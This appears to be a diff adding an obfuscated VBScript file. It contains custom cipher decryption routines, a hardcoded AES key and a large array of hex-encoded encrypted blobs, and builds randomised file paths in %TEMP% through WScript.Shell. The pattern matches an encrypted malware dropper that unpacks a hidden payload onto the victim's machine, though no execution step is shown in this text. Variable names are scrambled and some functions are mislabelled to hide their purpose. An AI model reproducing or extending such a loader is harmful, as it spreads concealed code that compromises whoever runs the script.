+    Add32Carry LatchPool70s, LiftBuffer19s, 0, PinchBuffer97
+    h2 = LiftBuffer19s
+    Add32Carry WeaveLayer87, EmitScope86, 0, LatchPool70s
+    h3 = EmitScope86
+    h4 = GraftGate47 + WeaveLayer87
+    If h4 >= 4294967296 Then h4 = h4 - 4294967296
+    c = Int(h4 / 4) + (h4 - (h4 Mod 4))
+    h4 = h4 Mod 4
+    h0 = h0 + c
+    c = 0
+    If h0 >= 4294967296 Then
+        h0 = h0 - 4294967296
+        c = 1
+    End If
+    h1 = h1 + c
+    c = 0
+    If h1 >= 4294967296 Then
+        h1 = h1 - 4294967296
+        c = 1
+    End If
+    h2 = h2 + c
+    c = 0
+    If h2 >= 4294967296 Then
+        h2 = h2 - 4294967296
+        c = 1
+    End If
+    h3 = h3 + c
+    c = 0
+    If h3 >= 4294967296 Then
+        h3 = h3 - 4294967296
+        c = 1
+    End If
+    h4 = h4 + c
+End Sub
+
+
+Sub DecryptBlock(k, ClipTable21, FoldField91)
+    Dim a, b, c, d, t, r, m, l, i
+    d = LoadUInt32LE2(ClipTable21, 0)
+    c = LoadUInt32LE2(ClipTable21, 4)
+    b = LoadUInt32LE2(ClipTable21, 8)
+    a = LoadUInt32LE2(ClipTable21, 12)
+    d = Add32(d, k(36))
+    c = Add32(c, k(37))
+    b = Add32(b, k(38))
+    a = Add32(a, k(39))
+    For i = 0 To 7
+        b = Add32(b Xor SBoxLookup(a), KeyTableLookup2(RotRight(a, 8)))
+        c = Add32(c, SBoxLookup(RotRight(a, 16)))
+        a = RotRightVar(a, 24)
+        d = d Xor KeyTableLookup2(a)
+        If (i Mod 4) = 0 Then a = Add32(a, d)
+        If (i Mod 4) = 1 Then a = Add32(a, b)
+        t = a
+        a = b
+        b = c
+        c = d
+        d = t
+    Next
+    For i = 0 To 15
+        t = RotRightVar(a, 13)
+        r = Rotate(Mul32Low(a, k(35 - 2 * i)), 10)
+        m = Add32(t, k(34 - 2 * i))
+        l = RotateMod(KeyTableLookup(m) Xor RotRightVar(r, 5) Xor r, r)
+        c = Sub32(c, RotateMod(m, RotRightVar(r, 5)))
+        If i < 8 Then
+            b = Sub32(b, l)
+            d = d Xor r
+        Else
+            d = Sub32(d, l)
+            b = b Xor r
+        End If
+        a = b
+        b = c
+        c = d
+        d = t
+    Next
+    For i = 0 To 7
+        If (i Mod 4) = 2 Then a = Sub32(a, d)
+        If (i Mod 4) = 3 Then a = Sub32(a, b)
+        b = b Xor KeyTableLookup2(a)
+        c = Sub32(c, SBoxLookup(RotRight(a, 24)))
+        t = Rotate(a, 24)
+        d = Sub32(d, KeyTableLookup2(RotRight(a, 16))) Xor SBoxLookup(t)
+        a = b
+        b = c
+        c = d
+        d = t
+    Next
+    d = Sub32(d, k(0))
+    c = Sub32(c, k(1))
+    b = Sub32(b, k(2))
+    a = Sub32(a, k(3))
+    StoreUInt32LE2 FoldField91, 0, d
+    StoreUInt32LE2 FoldField91, 4, c
+    StoreUInt32LE2 FoldField91, 8, b
+    StoreUInt32LE2 FoldField91, 12, a
+End Sub
+
+
+Function Mod(ByVal d, ByVal m)
+    Mod = d - Int(d / m) * m
+End Function
+
+
+Function ToUInt32(ByVal v)
+    If v < 0 Then
+        ToUInt32 = CDbl(v) + 4294967296
+    Else
+        ToUInt32 = CDbl(v)
+    End If
+End Function
+
+Function TypeWeight(PivotFacet73)
+    Dim tc
+    If IsNull(PivotFacet73) Then
+        tc = 0
+    ElseIf IsObject(PivotFacet73) Then
+        tc = 1
+    ElseIf IsArray(PivotFacet73) Then
+        tc = 1
+    Else
+        tc = 1
+    End If
+    TypeWeight = tc
+End Function
+
+Function UnpadPKCS7(SketchSlice29)
+    Dim WidenField80s, i, m, BlendBag33()
+    m = UBound(SketchSlice29) + 1
+    WidenField80s = SketchSlice29(m - 1)
+    If WidenField80s < 1 Or WidenField80s > 16 Or WidenField80s > m Then
+        UnpadPKCS7 = SketchSlice29
+        Exit Function
+    End If
+    For i = m - WidenField80s To m - 1
+        If SketchSlice29(i) <> WidenField80s Then
+            UnpadPKCS7 = SketchSlice29
+            Exit Function
+        End If
+    Next
+    ReDim BlendBag33(m - WidenField80s - 1)
+    For i = 0 To m - WidenField80s - 1
+        BlendBag33(i) = SketchSlice29(i)
+    Next
+    UnpadPKCS7 = BlendBag33
+End Function
+
+
+
+Sub InvCipherRound(ks, state)
+    Dim i, PackTile93s, MergeField92(15), o, t, u, v, w
+    i = 10
+    For o = 0 To 15
+        state(o) = state(o) Xor ks(i * 16 + o)
+    Next
+    ShiftRows state, 1, 1
+    ShiftRows state, 2, 2
+    ShiftRows state, 3, 3
+    For o = 0 To 15
+        state(o) = AES_InvSBox(state(o))
+    Next
+    PackTile93s = 10
+    Do While PackTile93s > 1
+        PackTile93s = PackTile93s - 1
+        i = i - 1
+        For o = 0 To 15
+            MergeField92(o) = state(o) Xor ks(i * 16 + o)
+        Next
+        For o = 0 To 3
+            t = MergeField92(4 * o + 3) Xor MergeField92(4 * o + 2)
+            u = MergeField92(4 * o + 1) Xor MergeField92(4 * o)
+            v = GFMultiply(9, t Xor u)
+            w = v Xor GFMultiply(4, MergeField92(4 * o + 2) Xor MergeField92(4 * o))
+            v = v Xor GFMultiply(4, MergeField92(4 * o + 3) Xor MergeField92(4 * o + 1))
+            state(4 * o + 3) = MergeField92(4 * o + 3) Xor v Xor GFMultiply(2, MergeField92(4 * o) Xor MergeField92(4 * o + 3))
+            state(4 * o + 2) = MergeField92(4 * o + 2) Xor w Xor GFMultiply(2, t)
+            state(4 * o + 1) = MergeField92(4 * o + 1) Xor v Xor GFMultiply(2, MergeField92(4 * o + 2) Xor MergeField92(4 * o + 1))
+            state(4 * o) = MergeField92(4 * o) Xor w Xor GFMultiply(2, u)
+        Next
+        ShiftRows state, 1, 1
+        ShiftRows state, 2, 2
+        ShiftRows state, 3, 3
+        For o = 0 To 15
+            state(o) = AES_InvSBox(state(o))
+        Next
+    Loop
+    For o = 0 To 15
+        state(o) = state(o) Xor ks(o)
+    Next
+End Sub
+
+
+
+Sub Add32Carry(ByRef hi, ByRef lo, ByVal MergeToken99, ByVal BraceFrame82s)
+    Dim c
+    lo = lo + BraceFrame82s
+    c = 0
+    If lo >= 4294967296 Then
+        lo = lo - 4294967296
+        c = 1
+    End If
+    hi = hi + MergeToken99 + c
+    If hi >= 4294967296 Then hi = hi - 4294967296
+End Sub
+
+Function DecryptCBC_Blk(SweepSchema77s, iv, SketchSlice29)
+    Dim k, ClipPacket88s(), SlideWriter29(), ClipTable21(), ProbeRange40(), WidenSchema39s, i, m
+    k = ExpandRoundKeys(SweepSchema77s)
+    m = UBound(SketchSlice29) + 1
+    ReDim ClipPacket88s(15)
+    ReDim SlideWriter29(m - 1)
+    ReDim ClipTable21(15)
+    ReDim ProbeRange40(15)
+    For i = 0 To 15
+        ClipPacket88s(i) = iv(i)
+    Next
+    WidenSchema39s = 0
+    Do While WidenSchema39s < m
+        For i = 0 To 15
+            ClipTable21(i) = SketchSlice29(WidenSchema39s + i)
+        Next
+        DecryptBlock k, ClipTable21, ProbeRange40
+        For i = 0 To 15
+            SlideWriter29(WidenSchema39s + i) = ProbeRange40(i) Xor ClipPacket88s(i)
+            ClipPacket88s(i) = ClipTable21(i)
+        Next
+        WidenSchema39s = WidenSchema39s + 16
+    Loop
+    DecryptCBC_Blk = SlideWriter29
+End Function
+
+Function ToInt32(ByVal d)
+    If d >= 2147483648 Then
+        ToInt32 = CLng(d - 4294967296)
+    Else
+        ToInt32 = CLng(d)
+    End If
+End Function
+
+
+
+Function Rotate(ByVal v, ByVal n)
+    n = n And 31
+    If n = 0 Then
+        Rotate = v
+    Else
+        Rotate = RotLeft(v, n) Or RotRight(v, 32 - n)
+    End If
+End Function
+
+Sub InvShiftRows(SketchSlice29, ByVal at, ByVal SealFlag49)
+    Dim MergeField92(3)
+    MergeField92(0) = SketchSlice29(at)
+    MergeField92(1) = SketchSlice29(at + 4)
+    MergeField92(2) = SketchSlice29(at + 8)
+    MergeField92(3) = SketchSlice29(at + 12)
+    SketchSlice29(at) = MergeField92((SealFlag49 + 0) And 3)
+    SketchSlice29(at + 4) = MergeField92((SealFlag49 + 1) And 3)
+    SketchSlice29(at + 8) = MergeField92((SealFlag49 + 2) And 3)
+    SketchSlice29(at + 12) = MergeField92((SealFlag49 + 3) And 3)
+End Sub
+
+
+Function FinalizeIntegrity(ByVal h0, ByVal h1, ByVal h2, ByVal h3, ByVal h4, ByVal n0, ByVal n1, ByVal n2, ByVal n3)
+    Dim t, g0, g1, g2, g3, g4, BlendBag33(), i
+    t = h0 + 5
+    g0 = t - Int(t / 4294967296) * 4294967296
+    t = h1 + Int(t / 4294967296)
+    g1 = t - Int(t / 4294967296) * 4294967296
+    t = h2 + Int(t / 4294967296)
+    g2 = t - Int(t / 4294967296) * 4294967296
+    t = h3 + Int(t / 4294967296)
+    g3 = t - Int(t / 4294967296) * 4294967296
+    g4 = h4 + Int(t / 4294967296)
+    If Int(g4 / 4) <> 0 Then
+        h0 = g0
+        h1 = g1
+        h2 = g2
+        h3 = g3
+    End If
+    t = h0 + n0
+    h0 = t - Int(t / 4294967296) * 4294967296
+    t = h1 + Int(t / 4294967296) + n1
+    h1 = t - Int(t / 4294967296) * 4294967296
+    t = h2 + Int(t / 4294967296) + n2
+    h2 = t - Int(t / 4294967296) * 4294967296
+    t = h3 + Int(t / 4294967296) + n3
+    h3 = t - Int(t / 4294967296) * 4294967296
+    ReDim BlendBag33(15)
+    StoreUInt32LE BlendBag33, 0, h0
+    StoreUInt32LE BlendBag33, 4, h1
+    StoreUInt32LE BlendBag33, 8, h2
+    StoreUInt32LE BlendBag33, 12, h3
+    FinalizeIntegrity = BlendBag33
+End Function
+
+Function BuildTempPath(StampRecord26, ShiftPool22)
+    Dim sh, td
+    Set sh = CreateObject("WScript.Shell")
+    td = sh.ExpandEnvironmentStrings("%TEMP%")
+    BuildTempPath = td & Chr(92) & StampRecord26 & CStr(Int((Timer * 1000) Mod 100000)) & "." & ShiftPool22
+End Function
+
+
+
+Function Base64Encode(PackScope45)
+    Dim WeavePort67, WalkTag49s, i, PulseParser20, b1, b2, b3, n, ShiftHeader17
+    WeavePort67 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
+    WalkTag49s = ""
+    ShiftHeader17 = UBound(PackScope45)
+    i = 0
+    Do While i <= ShiftHeader17
+        b1 = CInt(PackScope45(i))
+        If i + 1 <= ShiftHeader17 Then b2 = CInt(PackScope45(i + 1)) Else b2 = 0
+        If i + 2 <= ShiftHeader17 Then b3 = CInt(PackScope45(i + 2)) Else b3 = 0
+        n = b1 * 65536 + b2 * 256 + b3
+        WalkTag49s = WalkTag49s & Mid(WeavePort67, ((n \ 262144) And 63) + 1, 1)
+        WalkTag49s = WalkTag49s & Mid(WeavePort67, ((n \ 4096)   And 63) + 1, 1)
+        If i + 1 <= ShiftHeader17 Then
+            WalkTag49s = WalkTag49s & Mid(WeavePort67, ((n \ 64) And 63) + 1, 1)
+        Else
+            WalkTag49s = WalkTag49s & "="
+        End If
+        If i + 2 <= ShiftHeader17 Then
+            WalkTag49s = WalkTag49s & Mid(WeavePort67, (n And 63) + 1, 1)
+        Else
+            WalkTag49s = WalkTag49s & "="
+        End If
+        i = i + 3
+    Loop
+    Base64Encode = WalkTag49s
+End Function
+
+Function DecryptCBC_InvRound(SweepSchema77s, iv, SketchSlice29)
+    Dim ks, ClipPacket88s(), SlideWriter29(), ClipTable21(), WidenSchema39s, i, m
+    ks = AESKeySchedule(SweepSchema77s)
+    m = UBound(SketchSlice29) + 1
+    ReDim ClipPacket88s(15)
+    ReDim SlideWriter29(m - 1)
+    ReDim ClipTable21(15)
+    For i = 0 To 15
+        ClipPacket88s(i) = iv(i)
+    Next
+    WidenSchema39s = 0
+    Do While WidenSchema39s < m
+        For i = 0 To 15
+            ClipTable21(i) = SketchSlice29(WidenSchema39s + i)
+        Next
+        InvCipherRound ks, ClipTable21
+        For i = 0 To 15
+            SlideWriter29(WidenSchema39s + i) = ClipTable21(i) Xor ClipPacket88s(i)
+            ClipPacket88s(i) = SketchSlice29(WidenSchema39s + i)
+        Next
+        WidenSchema39s = WidenSchema39s + 16
+    Loop
+    DecryptCBC_InvRound = SlideWriter29
+End Function
+
+Function RijndaelKeySchedule(SweepSchema77s)
+    Dim l(3), s(), a, b, h, j, n, c, P, Q
+    P = HexToUInt32("b7e15163")
+    Q = HexToUInt32("9e3779b9")
+    For j = 0 To 3
+        l(j) = 0
+    Next
+    For j = 0 To 15
+        l(j \ 4) = l(j \ 4) Or RotLeft(SweepSchema77s(j), (j Mod 4) * 8)
+    Next
+    ReDim s(43)
+    s(0) = P
+    For j = 1 To 43
+        s(j) = Add32(s(j - 1), Q)
+    Next
+    a = 0
+    b = 0
+    n = 132
+    c = 4
+    For h = 0 To n - 1
+        a = Rotate(Add32(Add32(s(h Mod 44), a), b), 3)
+        s(h Mod 44) = a
+        b = RotateMod(Add32(Add32(l(h Mod c), a), b), Add32(a, b))
+        l(h Mod c) = b
+    Next
+    RijndaelKeySchedule = s
+End Function
+
+
+
+Function RotateMod(ByVal v, ByVal y)
+    RotateMod = Rotate(v, Mod(ToUInt32(y), 32))
+End Function
+
+
+
+Function HexToBytes(text)
+    Dim n, i, a()
+    n = Len(text) \ 2
+    If n < 1 Then
+        ReDim a(0)
+        a(0) = 0
+        HexToBytes = a
+        Exit Function
+    End If
+    ReDim a(n - 1)
+    For i = 0 To n - 1
+        a(i) = CLng("&H" & Mid(text, i * 2 + 1, 2))
+    Next
+    HexToBytes = a
+End Function
+
+Dim AesKey
+AesKey = "*x52SikcXitel2EFxWwPuCwc"
+Dim EncryptedBlocks(67)
+EncryptedBlocks(0) = "2C3F9443093238B03BBD97CD61389204ED8BCE3C3648AFE650BB195FA6DAC261E18CF92688D8EF3221776E00E7BAC5487204F3BD3FBA91319C543FD1B154B8368375CD8BA7CED39F2B322E115E84369E21631D1265EEEBBC6728849C73A0973E9C35760DA6DA5EC904F4373A84743CA9CC6B467323F45E66A6D7E37CF2304F7BBF41A97F4968866953FEDC1A71EAED35307FD5DCEF5BAF550F5378B5DCC5B2E51241BE2CBA3B0F16B63B9CC671618C16B8F8EFA801825054F077072DF73739B0AD8FB73DD90C25E21DE29A52B13F580067543C92BA0987546CBDB04B3834FB8C67AB46FD0838FE7DA57C02042DEC3B106DF183EDEF18852A7FD9CD31483F23A39518C7E7900105D500EDF3D9F175B47F020FFED26363EED5FAE9F3F3080B833596016961DFD8460D4F36690B3D8D2FE38CA346C6F94D6658EB1FDE677F5A6C539CC8FC25689CD982EDADC50D68B231FD783099AE04FAE6C80F520DA55244BF7821A7D92CA6EEE49BCB3FEB9E6796BD1DFBB70552830DCB0D33D2BC944B0B4495B54F0B371BEDC5753F4607C55597D248591A3E6006B178D33D9D876BC469C15CE9DFE4D06388A8C385A7AE4C5B5021BE0CEBEB1F80B9FA4304AD0C16EAED4A015A374BA1454856AD1112E5AD3F0CEB25F9EC16CE7F7D615646394EA00C83959679E9DB9C7B52EA9B9C9BCF17E11EF7861BAED8E688ED9C038AA44518E189414E"
+EncryptedBlocks(1) = "2814325DA4F33EB6C8F9A7651613A167F03442984D0BA59303351605A794295EFC2C35B37D5D02CCE39BFBF4C3B919B76D77F5E262B37B75591B5F17A2BD24E092D8F29FE934673387EBCE60CF781DBAD6589DF17CE1B07D8B16A93CB20D96B7AE7641217AA93B113E3A5065075BE91B9E8F4FF05149DBF7731E1E73EE8FDCAA99072D4B750089425B46D2F45A19B0C282AB158D2FAE62C78FE699BCE05B7CD1F805536CD7AB5B933E1A59092AEEFAA996D5B889BC10B943DC1D0AB48E9E9F48CF603754CF62BC2A0D96FF68E176BF117AD3EC834A92289D9F59243809CD8F171F36C3F3605D3D3188C62708032E892408CF049BE65C0E57884C6669810693AA6CD832A68E2CD093B2BF64BE8411BEF10B62245176129E7FD807513F8E37F50AC2FFD15D01DCF4E5424162F1E240908A126DE061CF6E729A6C780231B967A471B653C0AF43A08BE2B37BF908A2425AFC8BC77F6A04DC96EC4B718E97E0FF64D36D849790A53237DD662A65CF8954FFE90E68FD77204D494C7BE00B2FCC2D0348F8CC76826FBB6256CC50F6FAD4A6BB8A874E020C98225B46B37354FBCB1ABB12BA4A449359C5740EAAD7AB3B174999D7CEEC46BEBCFEDB85667F039C9470720C39BBE4EE9817F2B0FEC91903B7382F4ABE7B7F717B502F1FD7BA6B87303A29B008D11070A350ACFFB130F1C30F6E444663149F03B2EAE89DCDAA3038E7BE4937"
+EncryptedBlocks(2) = "B38C8CB87E672CA49B0B034C0EBEB2DCA01E130355A8F6173FED0533B8458DBD009F9BB601847013CD757066605CE49B1D6CBC5BCCD4AF9E926CD59AF6E123AB48726DC1236829A0F325E99047BD2CB496EFB3730AC7806CB560F2AAE0DE2A6CBC94A7117CFE6583E5605038E0D234E15E9F5F4CDD5E523A33AF1CF8A7CA45A9DC88BAB145C7C3BD706536E0840B39AD0F96E84D0518C2D1055699B4B0BD92B96313C26460792E09579CCAA8382E5F043715688010CEE8A872A61BB376DA3AEB8C9078825E5F2838F39DB5A425F532F451AB2ABB4E33C5F614C5402DA043AEB4E5F3535FAE5855FA49A622B1204B0C7D6BB231E5332367E3583E79705DD7FB971FBFD5B3067330D1345CFC58EE5D56D46F3E659CE1E7962E7072DD642A9516A5BF97F787A9D828F67AA02E94067D3B83DCB2241D134D6EFE1F8C97D408CADD17240D24C272BE05BDC446AA0E29FA0864C128CF411AEB156A881D34910652C50FED2E99AF36A265169ACF7C0F028F072AB389F2A1AD21E4BFFC58A0B28CF60768002050474A74CF64C5CFB6F4880F6C6295AD9D7720452707328E2AC7C61967CDAB33EB6F5253727B41F7DBCD776AFF6F0A9E31E9F34752A23E704267B88D0AF051BA55907E7708229FDA82DB965710D0F15DD362B8EF1666820D4FCE59505636FC4FC46325D91F47C0D0A366EB276E359BA1612CC9D0BC4768F7D2A965FC03E2"
+EncryptedBlocks(3) = "9C1D74A45530225AF319168D641A72E2B801D0FD01C231E0CA84429E462320F3AA73A85412A9FA983D5A340BD17FCC6CCDA00B094ACF6A68565D7482BEDBFE5F1926A07BE70D0D6F5861E15C06D6FB58F99111F3DB6233EF1934B253B832C377F2E67BB7ECEE8A5E06865464431A1106FF58EF177E781E48BC6C1AF7DBFF87C3070BD7F9EAC08C3A8A7C4EABAC86BF266E624215FAA945D07F0F9BA5054CFCBB09215BE1E668AC8B52AFE769A25D41FA11419BA93B8DEDBBA5EB1C383B8291AF56CF9493831BDC945CDDD41C7D28E4E521120D1FA68B0822C8B0EA2B5FA9A25CE90606E946509AA519C392655C628971D6A715BAB1DC0DAC422585D94460E1C3CF49824A784DEE00283E35D4037A30135DF1D2A71B4FF08131E55F9685959050301FC98601D385432B0512C28F7C7A5B9B19FB83F0018A2E90958804312F59AD602AAD3952E7BC33985A2E2FF9CF3D2C176D94104E91CA3267671B38810F930B4821BAE4ADAC358937365D3ACA5B2F05A72B76CD614ABC35D073590CBF138065D4FB44F85A91C1C9FEB2E4BE0377189B5AECE6378600BE3E582EE00E9C45054AE81E2D252748535C56FC55CF0893CD3966AF75071EAEAA6A271FE88D1CDD153B3F2547282E98B8D71A4EF6CA689FA4F48427CC3A5AEFEC585926D311C308FC8965577D8813165ADA555477E828479A7A2D533B526E060AC017288A2C1D3E24D5"
+EncryptedBlocks(4) = "2D9CDC13766585F4D8AFD217ED0EA350793DA759B62D1D46CAC24EB5C774ECB6F51B0692EDCBCE1F714788333A30BEC86ABF6C9FFB7F62D0B3E267DDC0766702415E560F9B3C09FE477D9E22FB6398EF5574FF8E64D4A48D2D177AB9F0D1176958607B21A9DF6D7FC57FC2D769D6FF668C9508BFA314DC3D11F2B3A9C8FF5A441380D37E2C603819932AA58FCFAF764918F7B513E53D33A17E965F624490A238E5B4FA831EBDB9CE10CB9C0320422B66CE0D92815D47C92EAAAE4277EE378A92B003F0E1F1BEAEE9496A350A9F951D33AD66B706DA7E6241CE8191063706D5ABDAF7C83FF60E04A4CF704E8A53C7B4750CB763A9CD40FA83C712485F1C2200DDE0F570BD2EAF3B12B833CDAE9512510BA31BC98E790852C3D3F37F4472C29055EAB8DBC00C7AAD4B83893AC4013D035155467582E6DFE3662340667632DBB8FA00B970739369F157B793E9061DF69F66EA9A330A5C27A0545EFEEB1E9F5ED24A0127EA9BBDE3DD2DA208D00E7A680D926D8DA3A950E79503EC58653029BFAD7FC067FD7C8D3D4B3EF113667762756E94F0DDF93D058A1D0E646F297EF3D3EABB93EDE42AB742BADFA9EECAAF752BD21088218CE5DE314855D70F5ED58A9A2620388648DC028D7BA6E2BEB3DE80BC5AA24F45375CEF771FC0C151A5C470B85254A3540123CD2B95ACA909762043A9A25FF1E76AF0C07618118951A2FEF67F107F"
+EncryptedBlocks(5) = "31BC0853C880049EA307BF2F67317CA04633DCDE0707177DBD000A30779DFD49C872639A7961ED022897F8B133E7148FDD2E2792AB9D5E4D6AAD2AE167C43E14698A36E441E979FE58671A85B2E5478261CE1BEC9A6CBCD46687D77ED4C0568AB2DDBF9CC3B533BF947CA5CEC0AFC77BE5FC6295A436F6969299FE100F9D036299C8D12B849DA64643B8F0B03AC8FC299D9989A135B8C251107495BA41B202C7FE67731F281670DF5FF4D0E77ABA845FFA149E2293C8A7028D3AC8559043AC0D801435B48DF0F984C4DBE7EC5A62DEF55F75FCCD62556B8A9EF2876145A4CC7B5FE098419795E499CF07ACDDB43D6FC7234B362B8E29DDBC31DD66EBB913140CFE5ACFDD7503ACA154D19BF323B39E9363D4FAE6954FC56E84BC10DCC235C1295BC84B8A782196FC44A40397517AF11AFBC312A01FD6B1C0C98C832ED36D7B89C8AD00AAE347EB5E9A7E7420FDC8CEDD35A87E9AFBE22FC436A125D88D56C5EAB1213727F1A8DD26F38E02449EB2286E2BB54283079E156A7DE777EFCF67344F5632984180073DAF0A8A2B77C850A276E366BD68DA7C7C7AD23280851B12674615772740770B57C89E3230ECB16050A6EF4BF99F0C90313D9968336C324C7AD5EB86E10F8C080A828D4B9BDEA200064BE09CE1B34E000E04D3A0965DE07AE537B74B781976E0329E04E0B65D64C6CC8CD542B4124D20FE6C02181D38C46C451E"
+EncryptedBlocks(6) = "E0315D3E060E02C3367622A4A85FFA3C254B0415913B091696E26BC9FBDFB7A03AAEE2F1CA4A0178FA17030E9792AA5BAA38FD97F7C481C293AFC39247D9511B547903E69164EAF5C13E0264CC6F24E9664DC2D1DB87456E6A43C4211BD3E5180AA725DDB1BC4E9E6AF6FD2BFFC0121A9B9CE41ED1EA3AA4DE9C8BFF3E87BAADCA692AC9D0DB988557AF1E4EFB1C4369E4C1A37C404ED976B89407C7929BD1BA16BE1109FFB92E7F3664FDE7350F6B74B0FAC746F1E3830FFC176B2BB01E35EEF382BC8F281CD9C507CEE97787741B2A3F3F15D38453B54FAABE93D19CDC1A29E1D5074E2F28E3ABCF07B65A07B51D0B201474C9AE8BAF4F02BADC7BAF9584A1F752C306BC93C0F813D600739BF5D4ECAF6913C659CC170EA091A38EF56E1E8326F8D4E9AC6FBA051333F515C25D2075388241A205D85E364C52867E019CAEE644E2C61748F1070A38547EB1E6810013DD4535F8C9AC36FE14B8F09D45E20FE349507AAB38842F00B488EF24BE9835166B6C2ED2EE32C642B387CD37BA61A0FF5CD408315F7A89843CED7FA06F65726A471364EE8B3130E6FBFE01650335E0228EB60B8E6528AD9DBB9AA7A208B94DA7E91EDAE99603235480F8DD32EDE5A96050EFE4DF33A9458C3747E556A21DDFB461732EFA2960F606CD125BDD8E01A94D2B2EC973083C21E7D8B3A8A5A6D6774597EADA59479368CC06CF8AC132DB6EA1"
+EncryptedBlocks(7) = "AAB6ED5594DE46646F06A5403386605AD5EB81C71038198CB83FE103A00DB96CC7803DA01A4CE4F0116B8283495599FF80CADDE767D6D6AD69F36B99B76B09A4D8999835486A202610620FDD78B9B14418B2FE68C1067ABC9AA320006B13DC054984A69EC90EE23C4FEEAE717162AB300000115A8ADD016A71ADB6DF0B0E10BDF05BD969BECC9184D0EE9B958B80CADC49336CF9BB09E22029B0393D1E2C01367414FE0612000D69289058A9D3F173AE8A6B36422BDD75127A384FB20434423CE6ED5C42BEEA658D8D495BB73B80CC3C0BDCC992747E6EB48F001D728FF89D4F37F934498BA70BEC5B7011B3496294C558E546D28103F9C06689CB45F38E8345D1868CB6BCACE45758A1827F76F57507CCDCE7B8662C160E5E6E21BC0E7847CB8ADA83A38BF0DC24EFEAA96831562DF3292B9ADB1AF38F98A704836B37D843FC2B561E7E7E2F0F5A0C0716159659C87ED776F48C7A1FEEA3DB928E72238230C1397B02967834857AC2EE925BEA2CA0E28966A5CED0CB23DF7006CAD6C328BEF48DAC6CF00FB000DEBE1CFA1586C4483D07653254A6A5F7344BF62E11F0525463DBEAF5CCD3E50BA047DC15873A054197A32A10B285859626747F397B95585547B26BC5040F292AB1D58F006D4FDF2B93B75A3EE33D7C3016830AC6288C5DA562BEF0FEA7BCAB93703884D7A0953F8C81E2371B613A590AAF7F5C1441B4CDBAD0"
+EncryptedBlocks(8) = "16EDBB24088CBA0E46CBB36FB9E74D969BF50CCFB2C3BD2998F1E12B2A8E326BA36960D46DD62682C2C6280FF2A2EA340AB2F2731330D6BBAF47C9EA32E67F15BC9BD505D9717358AB044FFC7E2394E2E770E40126E09FB0BF0AC7708C34EC41283DE6551AAFB4A8E87B8534731252E425C11E95BCF9A6E521B3E682F7611085251DD11CC1ADD24AA453C1392E77E166A4265E4A68500FBC78E11AD26C213686C292CEFBCA9BCF095C66B6C40AAF5306CDB308184FA55F054AE4348131FC3A67C3D30799E845942EE758F13DFDD679CBBBEC76F6E6A43CBC196A8D66FE21B79AF8119331CEC5494C6C4EA6179C150BD7C9345964B005C8661C062E255E44EBB116E8BDD5E81D72DD622F5D4ED319E9A31EF65374171218E9ABFC8EF7EB1A053088489F33E7D9BE4001D51174AB285171DADB9E34A1D9AB3F62C3BD6D463FB2061E86ADE57C0706F181D1152C4CD3831D72BB6310CDF44F5873C9707DC194CBDE949EEF9E6C6D5FB0F22625DA7B65698C56F98E47EAC26E1D6F271577B99DE8A18B73411447FE4E2F295B43FCC12BFD537C5906A764B13AED67E676F147BFC94A68D7427D2C385C7717A5F214AF00811C614EFEAE6034880A5508B5AFF3028CD951A003F00DDE56006F56751EF6D5574FE874AC92A6FD1FA9F3D1A554BE9A298EA41B3A0F0C6EC0B42315EE0FE7C35A78344AE6BC510DFD76D9D2AC550AFD996B"
+EncryptedBlocks(9) = "BE2BF86033EC5D63B4C1EB7EDD002F58FBA8FAAA16E44CCAAA92BD41AC116AED53330DD1C28178B8B043A66298F94E79F82734B4CA0D0C33F1E2BC844C071A892D8CA88519D7FE0E3A9CF67936D7C1D6B239083E3907175474A22E37360AA66914F976B91E27FC40A45C1A61BD3DBC4DFB5DCD0C4AE9CBD9D112018ECE5996D9ECC132C383446DEDF3003DF6B7E142ACED5558BF4264FB3FBF34168DAE0C91F408FD887A2A92532FADFDCFFB87A57808FDEE736139AF22AD42AB006FAD5D46E1793E7230A4F337EB395ACE0F70E595A9E23BB92CC55EB3AD5F030B98F24892D4220A211C86D447009C4F25728B0A43A42E847161353D0CA5D88869A23D5F40F86733FFC43E6B109FA65C32BA5B16B76090032D62A0C9713D15AF9A3B5155E31292DA116D2BC9C9746F71AF842D36FFCC7BFD2402F815F155528475AD766F3E702849B91CC2852EAE02B59C895A71CD93BB51FEFF197909FBCF5111CB8A802EFD134387B35C3E6CB932F2E08A4684B5354C4790318477B6F423B72598E5ED58FC43FC2F27CEC617AF082F91D1BA58395BB640A43185FA20DA0AAFEFCECC7952BFC57DAD65B4318A84035B230BC18D9EF2A59DC6CD587EA3FE81B219E5DFAE7F41FB9FF567747771AD3E4D84E6BE059ABA068C421CE2C5B22B6D30AA33C4BDD2FAA6A480CBE01A73CA74F1CEE0CDB6E89E9F6E6D4CF663845A442A006970EC380B"
+EncryptedBlocks(10) = "9A5BD097C5230B9A58E20B3BDA032F1515F3476A8657FF878F42017A3FFD8359D4390C7764B2EB374F0981877B1A4CFFACAEAB90481815E4F5A217375BB0FC04F9E8D8D55FF0208798BD239B83F83BCFC23542320301114962087FB3273486A17A584EAC6BEFD62F282A93D4CD76669D8256AF969348119505AAD10319B6928870770350B50E5682437D6F2EDB9A03D20A23878500C732DE40FE1EC0529E42B1CF0757240F67D3D710E0DD3558A9437500E83F3F05DFB2D4A57F403104C8BDD05C10C4F9388F7F60B4E662490EAC7124E692FA4A363EFD3698A1D6F6806514C09C67E0A99D76C3BAC7482DBD474464956FD6E34B032A43DD93E1B896B2907831D378CAF822DE46DDC2A795CDBE5803602B3050947E5589D10BC642E5DCE0B60D2DABFF2DC08797A210049B78E2040B6599C61A80FAECE63EF6B2EC50BD2806AE8F8C4DAB4BF744FA636342F7FDCAB5DA8230BC93A3259E950145AED4F5D3191E32AF4979403B95DE495B890B737EF1CFD11F92AD730DEBDE28A6827C01017B2598784AB4B31D308B2A16B94EC34DC278544B07A01371855823D542362A3F02551417EC3E3C8C531739A3494ED2D962F540EC02FC0E0F767D2D444B07D1A3844E4655CBDECEB52D04D2D80FFBCBA55E08CD8C8EE5C96BE67DE7BD99BE534E65D89E20070295F9C2C4DFF75CC20D45AF29D98463C30FF10A9B07B75C9BCA4C9102"
